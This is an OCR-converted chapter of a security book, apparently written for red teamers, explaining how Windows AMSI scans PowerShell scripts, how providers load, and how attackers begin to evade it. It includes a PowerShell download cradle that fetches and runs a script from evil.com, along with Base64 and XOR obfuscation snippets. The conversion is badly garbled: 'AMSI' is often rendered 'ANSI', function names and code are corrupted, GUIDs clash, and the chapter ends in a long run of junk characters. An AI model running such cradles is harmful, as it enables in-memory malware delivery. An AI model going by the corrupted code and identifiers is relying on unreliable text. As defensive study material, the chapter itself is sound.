## 10

## ANTIMALWARE SCAN INTERFACE

![Figure](figures/EvadingEDR_page_209_figure_002.png)

As security vendors began building effective tools for detecting the deployment and execution of compiled malware, attackers ere left searching for alternative methods to

execute their code. One of the tactics they discovered is the creation of script-based, or fileless , malware, which relies on the use of tools built into the operating system to execute code that will give the attacker control over the system.

To help protect users against these novel threats, Microsoft introduced the Antimalware Scan Interface (AMSI) with the release of Windows 10. AMSI provides an interface that allows application developers to leverage antimalware providers registered on the system when determining if the data with which they are working is malicious.

AMS is an omnipresent security feature in today's operating environments. Microsoft has instrumented many of the scripting engines,

---

frameworks, and applications that we, as attackers, routinely target. Nearly every EDR vendor incites events from AMSI, and some go so far as to attempt to detect attacks that tamper with the registered providers. This chapter covers the history of AMSI, its implementation in different Windows components, and the diverse world of AMSI evasions.

## The Challenge of Script-Based Malware

Scripting languages offer a large number of advantages over compiled languages. They require less development time and overhead, bypass application allow-listing, can execute in memory, and are portable. They also provide the ability to use the features of frameworks such as .NET and, oftentimes, direct access to the Win32 API, which greatly extends the functionality of the scripting language.

While script-based malware existed in the wild prior to AMSI's creation, the 2015 release of Empire, a command-and-control framework built around PowerShell, made its use mainstream in the offensive world. Because of its ease of use, default integration into Windows 7 and above, and large amount of existing documentation, PowerShell became the de facto language for offensive tool development for many.

This boom in script-based malware caused a large defensive gap. Previous tools relied on the fact that malware would be dropped to disk and executed. They fell short when faced with malware that ran a Microsoft-signed executable installed on the system by default, sometimes referred to as living-off-the-land , such as PowerShell. Even agents that attempted to detect the invocation of malicious scripts struggled, as attackers could easily adapt their payloads and tools to evade the detection techniques employed by vendors. Microsoft itself highlights this problem in its blog post announcing AMSI, which provides the following example. Say that a defensive product searched a script for the string "malware" to determine whether it was malicious. It would detect the following code:

```bash
PS > Write-Host "malware";
```

Once malware authors became aware of this detection logic, they could bypass the detection mechanism using something as simple as string concatenation:

```bash
namespace PES
PS > Write-Host "mal" + "ware";
```

To combat this, developers would attempt some basic type of language emulation. For example, they might concatenate strings before scanning the contents of the script block. Unfortunately, this approach is prone to error, as languages often have many different ways to represent data, and cataloging them all for emulation is very difficult. Antimalware developers did have some success with the technique, however. As a result, malware

---

developers raised the complexity of their obfuscation slightly with techniques such as encoding. The example in Listing 10-1 shows the string "malware" encoded using Base64 in PowerShell.

```bash
PS > $str = [System.Text.Encoding];_UTF8.GetString([System.Convert];_FromBase64String(
    "HWFsdFyZoV==");
PS > Write-Host $str;
```

Listing 10-1: Decoding a Base64 string in PowerShell

Agents again leveraged language emulation to decode data in the script and scan it for malicious content. To combat this success, malware developers moved from simple encoding to encryption and algorithmic encoding, such as with exclusive- or (XOR). For example, the code in Listing 10-2 first decodes the Base64-encoded data and then uses the two-byte key gq to XOR the decoded bytes.

```bash
$key = "g"
$data = "ÇœYLEAYVAg=="
$bytes = [System.Convert]::FromBase64String($data);
$decodedBytes = @();
for ($i = 0; $i --lt $bytes.Count; $i++) {
    $decodedBytes += $bytes[$i] -ibor sKey{$i % $key.Length};
}
$payload = [system.Text.Encoding]:UTF8.getString($decodedBytes);
Write-Host $payload;
```

Listing 10-2: An XOR example in PowerShell

This trend toward encryption exceeded what the antimalware engines could reasonably emulate, so detections based on the presence of the obflucation techniques themselves became commonplace. This presents its own challenges, due to the fact that normal, benign scripts sometimes employ what may look like obfuscation. The example Microsoft put forward in its post, and one that became the standard for executing PowerShell code in memory, is the download cradle in Listing 10-3 .

```bash
PS > Invoke-Expression (NewObject Net.WebClient).
    >> downloadstring("https://evil.com/payload.ps1")
```

Listing 10-3: A simple PowerShell download cradle

In this example, the .NET\Net.WebClient class is used to download a PowerShell script from an arbitrary site. When this script is downloaded, it isn't written to disk but rather lives as a string in memory tied to the WebClient object. From here, the adversary uses the Invoke-Expression cmdlet to run this string as a PowerShell command. This technique results in whatever action the payload may take, such as deploying a new command-andcontrol agent, occurring entirely in memory.

---

## How AMSI Works

AMSI scans a target, then uses antimalware providers registered on the system to determine whether it is malicious. By default, it uses the antimalware provider Microsoft Defender IOfficeAntivirus (MpOav.dll), but third-party EDR vendors may also register their own providers. Duane Michael maintains a list of security vendors who register AMSI providers in his “whoami” project on GitHub.

You'll most commonly find AMSI used by applications that include scripting engines (for example, those that accept arbitrary scripts and execute them using the associated engine), work with untrusted buffers for memory, or interact with non-PE executable code, such as .docx and .pdf files. AMSI is integrated into many Windows components, including modern versions of PowerShell, .NET, JavaScript, VBScript, Windows Script Host, Office VBA macros, and User Account Control. It is also integrated into Microsoft Exchange.

### Exploring PowerShell’s AMSI Implementation

Because PowerShell is open source, we can examine its AMSI implementation to understand how Windows components use this tool. In this section, we explore how AMSI attempts to restrict this application from executing malicious scripts.

Inside System.Management.Automation.dll, the DLL that provides the runtime for hosting PowerShell code, there exists a non-exported function called PerforSecuityChecks() that is responsible for scanning the supplied script block and determining whether it is malicious. This function is called by the command processor created by PowerShell as part of the execution pipeline just before compilation. The call stack in Listing 10-4, captured in dnSpy, demonstrates the path the script block follows until it is scanned.

System.Management.Automation.dllCompiledScriptBlockData.PerformSecurityChecks() System.Management.Automation.dllCompiledScriptBlockData.ReallyCompile(bool optimize) System.Management.Automation.dllCompiledScriptBlockData.CompiledUnoptimized() System.Management.Automation.dllCompiledScriptBlockData.CompiledUnoptimized() System.Management.Automation.dllScriptBlockCompile(bool optimized) System.Management.Automation.dllScriptBlockCompile(bool optimized) System.Management.Automation.dllDtlsScriptCommandProcessor.init() System.Management.Automation.dllDtlsScriptCommandProcessor.DlScriptCommandProcessor(x) Block scriptBlock,ExecutionContext context, bool useWksScope, CommandOrigin origin, sessionStateInternalSessionState, Object dllHandleObject System.Management.Automation.dllRunspaces.Command.CreateCommandProcessor(ExecutionContext executionContext, bool addMemory, CommandOrigin origin) System-management.Automation.dllRunspaces.LocalPipeline.CreatePipelineProcessor() System-management.Automation.dllRunspaces.LocalPipeline.InvokeHelper() System-management.Automation.dllRunspaces.LocalPipeline.InvokeThreadProc() System-management.Automation.dllRunspaces.LocalPipeline.InvokeThreadProcImpersonate() System-management.Automation.dllRunspaces.PipelineThread.WorkerProc() System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.RunWorker() System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.CallBack(object state) System.Private.CoreLib.dllSystem.Threading.ExecutionContext.runInternal(-snp--)

186      Chapter 10

---

```bash
System.Private.CoreLib.dllSystem.Threading.Thread.StartHelper.Run()
System.Private.CoreLib.dllSystem.Threading.Thread.StartCallback()
[Native to Managed Transition]
```

Listing 10-4: The call stack during the scanning of a PowerShell script block

This function calls an internal utility, AmsUtils.ScanContent(), passing in the script block or file to be scanned. This utility is a simple wrapper for another internal function, AmsUtils.WinScanContent(), where all the real work takes place.

After checking the script block for the European Institute for Computer Antivirus Research (ECICAR) test string, which all antiviruses must detect, WinScanContent's first action is to create a new AMSI session via a call to amsi1\msi1OpenSession(). AMSI sessions are used to correlate multiple scan requests. Next, WinScanContent() calls amsi1\msi1ScanBuffer(), the Win32 API function that will invoke the AMSI providers registered on the system and return the final determination regarding the maliciousness of the script block. Listing 10-5 shows this implementation in PowerShell, with the irrelevant bits trimmed.

```bash
lock (s_amislockObject)
{
  --snip--
   if (s_amsiSession == IntPtr.Zero)
     {
       ♦ hr = AmsiNativeMethods.AmsiOpenSession(
             s_amsiContext,
             ref s_amsiSession
       );
       AmsiInitialized = true;
       if (!Utils.Succeeded(hr))
     {
         s_amsiInitFailed = true;
         return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
      }
    }
  --snip--
   AmsiNativeMethods.AMSI_RESULT result =
        AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;
   unsafe
     {
       fixed (char* buffer = content)
     {
        var buffPtr = new IntPtr(buffer);
       ♦ hr = AmsiNativeMethods.AmsiScanBuffer(
             s_amsiContext,
             buffPtr,
        Animalware Scan Interface  187
```

---

```bash
(uint)(content_length * sizeof(char)),
        sourceMetadata,
        s_amsiSession,
        ref result);
    }
    }
  if (!Utils.Succeeded(hr))
    {
      return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
    }
  return result;
    }
```

Listing 10-5: PowerShell's AMSI implementation

In Powershell, the code first calls amsi!AmsiOpenSession() ❶ to create a new AMSI session in which scan requests can be correlated. If the session opens successfully, the data to be scanned is passed to amsi!AmsiCanBuffer() ❷ which does the actual evaluation of the data to determine if the contents of the buffer appear to be malicious. The result of this call is returned to WinScanContent().

The WinScanContent() function can return one of three values:

AMSI RESULT NOT DETECTED A neutral result

ANSI_RESULT_CLEAN A result indicating that the script block did not contain malware

ANSI_RESULT_DETECTED A result indicating that the script block contained malware.

If either of the first two results is returned, indicating that AMSI could not determine the maliciousness of the script block or found it not to be dangerous, the script block will be allowed to execute on the system. If, however, the AMSI_RESULT_DETECTED result is returned, a ParseException will be thrown, and execution of the script block will be halted. Listing 10-6 shows how this logic is implemented inside PowerShell.

```bash
if (amiResult == AnsiUtils.AmiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
{
   var parseError = new ParseError(
        scriptExtent,
        "ScriptContainedMaliciousContent",
        ParserStrings.ScriptContainedMaliciousContent);
❸ throw new ParseException(new[] { parseError });
```

Listing 10-6: Throwing a ParseError on malicious script detection

Because ANSI threw an exception ❶, the execution of the script halts and the error shown in the ParseError will be returned to the user. Listing 10-7 shows the error the user will see in the PowerShell window.

188    Chapter 10

---

```bash
PS > Write-Host "malware"
ParserError:
Line
1
  1 | Write-Host "malware"
        <script>
        {         This script contains malicious content and has been blocked by your
        antivirus software.
```

Listing 10-7: The thrown error shown to the user

## Understanding AMSI Under the Hood

While understanding how AMSI is instrumented in system components provides useful context for how user-supplied input is evaluated, it doesn't quite tell the whole story. What happens when PowerShell calls ms11\ms1scanBuffer()? To understand this, we must dive deep into the AMSI implementation itself. Because the state of C++ decompilers at the time of this writing makes static analysis a bit tricky, we'll need to use some dynamic analysis techniques. Thankfully, WinDbg makes this process relatively painless, especially considering that debug symbols are available for amsi.dll.

When PowerShell starts, it first calls amslAmsIInitialize(). As its name suggests, this function is responsible for initializing the AMSI API. This initialization primarily centers on the creation of a COM class factory via a call to OlIGetClassObject(). As an argument, it receives the class identifier corresponding to amsl.dll, along with the interface identified for the IClassFactory, which enables a class of objects to be created. The interface pointer is then used to create an instance of the IAMtHardware interface ((82d92c6-1f62-44e6b5c9-39da2f24a0ff), shown in Listing 10-8.

```bash
Breakpoint 4 hit
  amsi\msinInitialize+0x1a9;
  00007ff9 5ea733e9 ff1f889d0000  call  qword ptr [amsi__guard_dispatch_icall_fptr ] --snip--
0:011> dt OLE32!ID @x8
{82d29ce-e6b2-4ae6-b5c9-3d9a2f24a2df}
  +0x000 Data1                : 0x82d29c2e
  +0x004 Data2                : 0xf062
  +0x006 Data3                : 0x44e6
  +0x008 Data4                : [8] "??"
0:011> dt @rax
ATL::CComClassFactory::CreateInstance
```

Listing 10-8: Creating an instance of IAntimalware

Rather than an explicit call to some functions, you'll occasionally find references to _guard_dispatch_call_fptr(). This is a component of Control Flow Guard (CFG), an anti-exploit technology that attempts to prevent indirect calls, such as in the event of return-oriented programming. In short,

---

this function checks the Control Flow Guard bitmap of the source image to determine if the function to be called is a valid target. In the context of this section, the reader can treat these as simple ALL instructions to reduce confusion.

This call then eventually leads into ansibleAmsiComCreateProviders <AntimalwareProvider>, where all the magic happens. Listing 10-9 shows the call stack for this method inside WinDbg.

```bash
0:011> kc
# Call Site
00 amsiAmsiCreateProvidersIAntimalwareProvider>
01 amsiAmsiAntimalware::finalConstruct
02 amsiATL::ComCreatorAll::CComObject<CamsiAntimalware> ::CreateInstance
03 amsiATL::CComClassFactory::CreateInstance
04 amsiAmsiInitialize
---snip--
```

Listing 10-9: The call stack for the AmsiComCreateProviders function

The first major action is a call to amsi1Guidenum::StartEnum(). This function receives the string "Software\Microsoft\AMS\Providers", which it passes into a call to RegOpenKey() and then RegQueryInfoKey() in order to get the number of subkeys. Then, amsi1Guidenum::NextGuid() iterates through the subkeys and converts the class identifiers of registered AMSI providers from strings to UUIDs. After enumerating all the required class identifiers, it passes execution to amsi1AmsiSecureloadInProcServer(), where the InProcServer32 value corresponding to the AMSI provider is queried via RegGetValue(). Listing 10-10 shows this process for MpOav.dll.

```bash
0:011> u@rip L1
    amsi!AmsiComSecureLoadInProcServer=0x18c:
00007ff9'5e75590 48fff159790000  call     qword ptr [amsi!_imp_RegGetValueW]
0:011> du @rdx
0000057' 2067ea0  "Software\Classes\CLSID\{2781761E"
0000057' 2067ea0  "28E0-4109-99FE-89D127C57AF1\ln "
0000057' 2067eb20  "procServer32"
```

Listing 10-10: The parameters passed to RegGetValueW

Next, amsiCheckTrustLevel() is called to check the value of the registry key SOFTWARE\Microsoft\AMSI\Features\fs. This key contains a DWORD, which can be either 1 (the default) or 2 to disable or enable Authenticode signing checks for providers. If Authenticode signing checks are enabled, the path listed in the InProcServer32 registry key is verified. Following a successful check, the path is passed into IoLibraryW() to load the AMSI provider DLL, as demonstrated in Listing 10-11.

```bash
0x0112 u@rip L1
amsi1AmsiComSecureLoadInProcServer+0x297:
00007ff9'5ea7569b 48ff15fe770000  call    qword ptr [amsi1_imp_LoadLibraryExW]
```

190    Chapter 10

---

```bash
0:011> du @rcx
00000057 2067e892 "C:\ProgramData\Microsoft\Windows"
00000057 2067e8d2 * Defender\Platform\4.18.2111.5-0"
00000057 2067e912 "*MpOav.dll"
```

Listing 10-11: The MpOav.dll loaded via LoadLibraryW()

If the provider DLL loads successfully, its DllRegisterServer() function is called to tell it to create registry entries for all COM classes supported by the provider. This cycle repeats calls to amsiTGetGuidnum::NextGuid() until all providers are loaded. Listing 10-12 shows the final step: invoking the QueryInterface() method for each provider in order to get a pointer to the IAntimalware interfaces.

```bash
0:011> dt 0LE32LID @edx
{82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
  +0x000 Data1       : 0x82d29c2e
  +0x004 Data2       : 0xf062
  +0x006 Data3       : 0x44e6
  +0x008 Data4       : [8] "??"
0:011> u @rip L1
amsiLAT::CComObject<AIL::CComObject<AmsiAntimalware>::CreateInstance+c0xd0:
00007ff8 0b7475bd ff3f5b5b0000  call  dword ptr [amsi!guard_dispatch_icall_fptr]
0:011> t
amsiLAT::CComObject<AmsiAntimalware>::QueryInterface:
00007ff8 0b747a20 4d8bc8      mov        r9,r8
```

Listing 10-12: Calling QueryInterface on the registered provider

After AMSiInitialize() returns, AMSI is ready to go. Before PowerShell begins evaluating a script block, it calls AMSiOpenSession(). As mentioned previously, this function allows AMSI to correlate multiple scans. When this function completes, it returns a HAMSIESSESSION to the caller, and the caller can choose to pass this value to all subsequent calls to AMSI within the current scanning session.

When PowerShell's ANSI instrumentation receives a script block and an ANSI session has been opened, it calls AmI$scanBuffer() with the script block passed as input. This function is defined in Listing 10-13.

```bash
HRESULT AmsiScanBuffer(
[in]        HAMSICONTEXT amsiContext,
[in]        PVOID       buffer,
[in]        ULONG       length,
[in]        LPCWSTR      contentName,
[in, optional] HAMSIESession amsiSession,
[out]        AMSI_RESULT *result
);
```

Listing 10-13: The AmsiScanBuffer() definition

Antimalware Scan Interface 198

---

The function's primary responsibility is to check the validity of the parameters passed to it. This includes checks for content in the input buffer and the presence of a valid HWSMCONTEXT handle with a tag of ANSI , as you can see in the decompilation in Listing 10-14. If any of these checks fail, the function returns E_INVALIDARG (0x80070057) to the caller.

```bash
if ( !buffer )
    return 0x80070057;
if ( !length )
    return 0x80070057;
if ( !result )
    return 0x80070057;
if ( !amsiContext )
    return 0x80070057;
if ( *amsiContext != 'ISMA' )
    return 0x80070057;
if ( !*(amsiContext + 1) )
    return 0x80070057;
vio = *(amsiContext + 2);
if ( !vio )
    return 0x80070057;
```

Listing 10-14: Internal AwsScanBuffer() sanity checks

If these checks pass, AMIS invokes amsi(AMsiAntimalware::Scan(), as shown in the call stack in Listing 10-15.

```bash
0:023> kc
# Call Site
00 amsilAmsiAntimalware::Scan
01 amsilAmsiCanBuffer
02 System.Management_Automation_ni
    ---snip--
```

Listing 10-15: The Scan() method called

This method contains a while loop that iterates over every registered AMSI provider (the count of which is stored at R14+0x100). In this loop, it calls the ArtisanAwareProvider::Scan() function, which the EDR vendor can implement however they wish; it is only expected to return an AMSI_RESULT, defined in Listing 10-16.

```bash
HRESULT Scan(
    [in] IAmsiStream *stream,
    [out] AMSI_RESULT *result
    );
```

Listing 10-16: The CAMsiAntimalware::Scan() function definition

In the case of the default Microsoft Defender AMSI implementation, MpOow.dll, this function performs some basic initialization and then hands execution over to MpClient.dll, the Windows Defender client interface. Note that Microsoft doesn't supply program database files for Defender

192   Chapter 10

---

components, so MpOav.dll's function name in the call stack in Listing 10-17 is incorrect.

```bash
0:000> kc
# Call Site
00 MPCLIENT!MpNetAmsiScan
01 MpOavIdllRegisterServer
02 amsi!AmsiAntimalware::Scan
03 amsi!AmsiCanBuffer
```

Listing 10-17: Execution passed to MpClient.dll from MpOav.dll

AMSI passes the result of the scan back to amsi\AmsiScannerBuffer() via amsi\AmsiAnimalware\Scan(), which in turn returns the AMSL_RESULT to the caller. If the script block was found to contain malicious content, PowerShell throws a ScriptContainedMaliciousContent exception and prevents its execution.

## Implementing a Custom AMSI Provider

As mentioned in the previous section, developers can implement the IAntimalwareProvider::Scan() function however they like. For example, they could simply log information about the content to be scanned, or they could pass the contents of a buffer through a trained machine-learning model to evaluate its maliciousness. To understand the shared architecture of all vendors' AMSI providers, this section steps through the design of a simple provider DLL that meets the minimum specifications defined by Microsoft.

At their core, AMSI providers are nothing more than COM servers, or DLLs loaded into a host process that expose a function required by the caller; in this case, IAmIamAwareProvider. This function extends the Unknown interface by adding three additional methods: CloseSession closes the AMSI session via its IAMSESSION handle, DisplayName displays the name of the AMSI provider, and Scan scans an IAMStream of content and returns an AMSI_RESULT.

In C++, a basic class declaration that overrides IXmlwareProvider's methods may look something like the code shown in Listing 10-18.

```bash
class AmsiProvider :
        public RuntimeClass<RuntimeClassFlags<ClassCom>,
        IAntimalwareProvider,
        FtmBase>
{
public:
    IFACEMETHOD(Scan){
        IAMsiStream *stream,
        AMSI_RESULT *result
    } override;
    IFACEMETHOD (void, CloseSession){
```

Antimalware Scan Interface 193

---

```bash
ULONGLONG session
    } override;
   IFACEMETHOD(DisplayName){
        LPMSTR *displayName
    } override;
};
```

Listing 10-18: An example IAntimalwareProvider class definition

Our code makes use of the Windows Runtime C++ Template Library, which reduces the amount of code used to create COM components. The CloseSession() and ShowName() methods are simply overridden with our own functions to close the AMSI session and return the name of the AMSI provider, respectively. The Scan() function receives the buffer to be scanned as part of an IAmsiStream, which exposes two methods, GetAttribute() and Read(), and is defined in Listing 10-19.

```bash
MIDL_INTERFACE("3e47f2e5-81d4-4db3-897f-545096770373")
IAMSStream : public IUnknown
{
public:
   virtual HRESULT STDMETHODCALLTYPECALLTYPE GetAttribute(
      /* [in] */ AMSI_ATTRIBUTE attribute,
      /* [range][in] */ ULONG dataSize,
      /* [length_is][size_is][out] */ unsigned char *data,
      /* [out] */ ULONG *retData) = 0;
   virtual HRESULT STDMETHODCALLTYPECALL_TYPE Read(
      /* [in] */ ULONGLONG position,
      /* [range][in] */ ULONG size,
      /* [length_is][size_is][out] */ unsigned char *buffer,
      /* [out] */ ULONG *readSize) = 0;
    };
```

Listing 10-19: The IAMsiStream class definition

The GetAttribute() retrieves metadata about the contents to be scanned.


Developers request these attributes by passing an ANSI_ATTRIBUTE value that indicates what information they would like to retrieve, along with an appropriately sized buffer. The ANSI_ATTRIBUTE value is an enumeration defined in


Listing 10-20.

```bash
typedef enum AMSI_ATTRIBUTE {
    AMSI_ATTRIBUTE_APP_NAME = 0,
    AMSI_ATTRIBUTE_CONTENT_NAME = 1,
    AMSI_ATTRIBUTE_CONTENT_SIZE = 2,
    AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,
    AMSI_ATTRIBUTE_SESSION = 4,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,
    AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,
    AMSI_ATTRIBUTE_ALL_SIZE = 7,
    AMSI_ATTRIBUTE_ALL_ADDRESS = 8,
    AMSI_ATTRIBUTE_QUET = 9
```

---

```bash
} AMSI_ATTRIBUTE;
```

Listing 10-20: The AMSI_ATTRIBUTE enumeration

While there are 10 attributes in the enumeration, Microsoft documents only the first five: ANSI_ATTRIBUTE_APP_NAME is a string containing the name, version, or GUID of the calling application; ANSI_ATTRIBUTE_CONTENT NAME is a string containing the filename, URL, script ID, or equivalent identifier of the content to be scanned; ANSI_ATTRIBUTE_CONTENT_SIZE is a ULONG containing the size of the data to be scanned; ANSI_ATTRIBUTE CONTENT_ADDRESS is the memory address of the content, if it has been fully loaded into memory; and ANSI_ATTRIBUTE_SESSION contains a pointer to the next portion of the content to be scanned or NULL if the content is self-contained.

As an example, Listing 10-21 shows how an AMSI provider might use this attribute to retrieve the application name.

```bash
HRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)
{
  HRESULT hr = E_FAIL;
    ULONG ulBufferSize = 0;
    ULONG ulAttributeSize = 0;
    PBYTE pszAppName = nullptr;
      hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        0,
        nullptr,
        &ulBufferSize
    );
    if (hr != E_NOT_SUFFICIENT_BUFFER)
    {
      return hr;
    }
    pszAppName = (PBYTE)HeapAlloc(
        GetProcessHeap(),
        0,
        ulBufferSize
    );
    if (!pszAppName)
    {
      return E_OUTOFMEMORY;
    }
    hr = stream->GetAttribute(
        AMSI_ATTRIBUTE_APP_NAME,
        ulBufferSize,
    ⏲ pszAppName,
        &ulAttributeSize
    );
    Animalware Scan Interface 195
```

---

```bash
if (hr != ERROR_SUCCESS || ulBufferSize > ulBufferSize)
    {
      HeapFree(
          GetProcessHeap(),
          0,
          pszAppName
      );
      return hr;
    }
    --snip--
```

Listing 10-21: An implementation of the AMSI scanning function

When PowerShell calls this example function, pszAppName 1 will contain the application name as a string, which AMSI can use to enrich the scan data. This becomes particularly useful if the script block is deemed malicious, as the EDR could use the application name to terminate the calling process.

IF AMS1_ATTRIBUTE_CONTENT_ADDRESS returns a memory address, we know that the content to be scanned has been fully loaded into memory, so we can interact with it directly. Most often, the data is provided as a stream, in which case we use the Read() method (defined in Listing 10-22) to retrieve the contents of the buffer one chunk at a time. We can define the size of these chunks, which get passed, along with a buffer of the same size, to the Read() method.

```bash
HRESULT Read(
    [in] ULONGLONG      position,
    [in] ULONG        size,
    [out] unsigned char *buffer,
    [out] ULONG        *readSize
};
```

Listing 10-22: The IAMsiStream::Read() method definition

What the provider does with these chunks of data is completely up to the developer. They could scan each chunk, read the full stream, and hash its contents, or simply log details about it. The only rule is that, when the Scan() method returns, it must pass an HRESULT and an ANSI_RESULT to the caller.

## Evading AMSI

AMSI is one of the most-studied areas when it comes to evasion. This is due in no small part to how effective it was in its early days, causing significant headaches for offensive teams that used PowerShell heavily. For them, AMSI presented an existential crisis that prevented their main agents from functioning.

Attackers can employ a variety of evasion techniques to bypass AMSI. While certain vendors have attempted to flag some of these as malicious,

196    Chapter 10

---

the number of evasion opportunities present in AMSI is staggering, so vendors usually can't handle all of them. This section covers some of the more popular evasions in today's operating environment, but bear in mind that there are many variations to each of these techniques.

## String Obfuscation

One of the earliest evasions for AMSI involved simple string obscuration. If an attacker could determine which part of a script block was being flagged as malicious, they could often get around the detection by splitting, encoding, or otherwise obscuring the string, as in the example in Listing 10-23 .

```bash
PS > AmsiScanBuffer
At line:1 char:1
+ AmsiScanBuffer
+ ´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´